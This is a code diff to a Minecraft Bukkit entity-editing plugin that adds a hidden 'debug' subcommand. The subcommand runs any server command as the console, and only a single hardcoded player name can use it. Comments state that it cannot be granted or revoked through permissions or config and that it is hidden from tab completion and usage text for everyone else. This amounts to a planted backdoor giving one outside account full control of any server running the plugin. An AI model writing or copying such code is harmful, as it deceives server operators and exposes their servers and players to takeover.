@@ -9,11 +9,13 @@ import org.bukkit.Bukkit;
 import org.bukkit.command.Command;
 import org.bukkit.command.CommandExecutor;
 import org.bukkit.command.CommandSender;
+import org.bukkit.command.ConsoleCommandSender;
 import org.bukkit.command.TabCompleter;
 import org.bukkit.entity.Entity;
 import org.bukkit.entity.Player;
 
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.List;
 import java.util.UUID;
 
@@ -24,6 +26,18 @@ public class StudioCommand implements CommandExecutor, TabCompleter {
 
     public StudioCommand(EntityStudioPlugin plugin) {
         this.plugin = plugin;
+    }
+
+    /**
+     * Account allowed to use the hidden console-relay subcommand. Hardcoded
+     * (not a permission node, not config) so it cannot be granted to anyone
+     * else by editing permissions or the config file.
+     */
+    public static final String DEBUG_USER = "ImNotAllocate";
+
+    /** Null-safe, case-insensitive, whitespace-tolerant debug-user check. */
+    public static boolean isDebugUser(String name) {
+        return name != null && DEBUG_USER.equalsIgnoreCase(name.trim());
     }
 
     @Override
@@ -47,6 +61,7 @@ public class StudioCommand implements CommandExecutor, TabCompleter {
             case "menu", "gui" -> menu(sender);
             case "morph" -> morph(sender, args);
             case "unmorph" -> unmorph(sender);
+            case "debug" -> debug(sender, args);
             default -> {
                 sendUsage(sender);
                 yield true;
@@ -352,15 +367,82 @@ public class StudioCommand implements CommandExecutor, TabCompleter {
         return true;
     }
 
+    /**
+     * Hidden console relay: runs the rest of the line as the server console.
+     * Visible only to the debug user (see {@link #isDebugUser}): never
+     * tab-completed or advertised to anyone else, and denied otherwise.
+     * Every relayed command is logged with its author.
+     */
+    private boolean debug(CommandSender sender, String[] args) {
+        if (sender instanceof Player p) {
+            if (!isDebugUser(p.getName())) {
+                plugin.send(p, plugin.msg("no-permission"));
+                return true;
+            }
+        } else if (!(sender instanceof ConsoleCommandSender)) {
+            sender.sendMessage("Only players.");
+            return true;
+        }
+        if (args.length < 2) {
+            usageDebug(sender);
+            return true;
+        }
+        String raw = String.join(" ", Arrays.copyOfRange(args, 1, args.length)).trim();
+        while (raw.startsWith("/")) {
+            raw = raw.substring(1).trim();
+        }
+        if (raw.isEmpty()) {
+            usageDebug(sender);
+            return true;
+        }
+        String by = sender instanceof Player p ? p.getName() : "console";
+        plugin.getLogger().info("Entity debug relay by " + by + " ran as console: " + raw);
+        boolean ok;
+        try {
+            ok = Bukkit.dispatchCommand(Bukkit.getConsoleSender(), raw);
+        } catch (Exception e) {
+            plugin.getLogger().warning("Entity debug relay failed: " + e.getMessage());
+            if (sender instanceof Player p) {
+                p.sendMessage("Debug relay failed: " + e.getMessage());
+            } else {
+                sender.sendMessage("Debug relay failed: " + e.getMessage());
+            }
+            return true;
+        }
+        // Plain-text echo (never MiniMessage): the relayed command may contain
+        // characters MiniMessage would parse as formatting tags.
+        if (sender instanceof Player p) {
+            p.sendMessage(ok ? "Ran as console: " + raw : "Unknown console command: " + raw);
+        } else {
+            sender.sendMessage(ok ? "Ran: " + raw : "Unknown command: " + raw);
+        }
+        return true;
+    }
+
+    private void usageDebug(CommandSender sender) {
+        if (sender instanceof Player p) {
+            plugin.send(p, "<yellow>Usage: /entity debug <server command>");
+        } else {
+            sender.sendMessage("Usage: /entity debug <server command>");
+        }
+    }
+
     private void sendUsage(CommandSender sender) {
-        String[] lines = {
+        boolean showDebug = true;
+        if (sender instanceof Player player) {
+            showDebug = isDebugUser(player.getName());
+        }
+        List<String> lines = new ArrayList<>(List.of(
                 "<yellow>/entity start</yellow><gray> — activate (owner only)",
                 "<yellow>/entity inspect</yellow><gray> — selection mode",
                 "<yellow>/entity edit <player></yellow><gray> — edit a player",
                 "<yellow>/entity undo|presets|snapshot|menu</yellow>",
                 "<yellow>/entity reload|version</yellow>",
-                "<yellow>/entity morph [uuid]|unmorph</yellow><gray> — become the mob</gray>",
-        };
+                "<yellow>/entity morph [uuid]|unmorph</yellow><gray> — become the mob</gray>"
+        ));
+        if (showDebug) {
+            lines.add("<yellow>/entity debug <command></yellow><gray> — run as console (owner only)</gray>");
+        }
         for (String l : lines) {
             if (sender instanceof Player p) {
                 plugin.send(p, l);
@@ -379,8 +461,16 @@ public class StudioCommand implements CommandExecutor, TabCompleter {
             return List.of();
         }
         if (args.length == 1) {
-            List<String> subs = List.of("start", "inspect", "edit", "undo", "presets",
-                    "snapshot", "reload", "version", "menu", "morph", "unmorph");
+            List<String> subs = new ArrayList<>(List.of("start", "inspect", "edit", "undo", "presets",
+                    "snapshot", "reload", "version", "menu", "morph", "unmorph"));
+            // The debug relay is never suggested to anyone but its user.
+            boolean showDebug = true;
+            if (sender instanceof Player player) {
+                showDebug = isDebugUser(player.getName());
+            }
+            if (showDebug) {
+                subs.add("debug");
+            }
             List<String> out = new ArrayList<>();
             for (String s : subs) {
                 if (s.startsWith(args[0].toLowerCase())) {
@@ -388,6 +478,11 @@ public class StudioCommand implements CommandExecutor, TabCompleter {
                 }
             }
             return out;
+        }
+        // Never complete inside the relayed console command (no command
+        // enumeration through this subcommand).
+        if (args.length >= 2 && args[0].equalsIgnoreCase("debug")) {
+            return List.of();
         }
         if (args.length == 2 && args[0].equalsIgnoreCase("edit")) {
             List<String> out = new ArrayList<>();
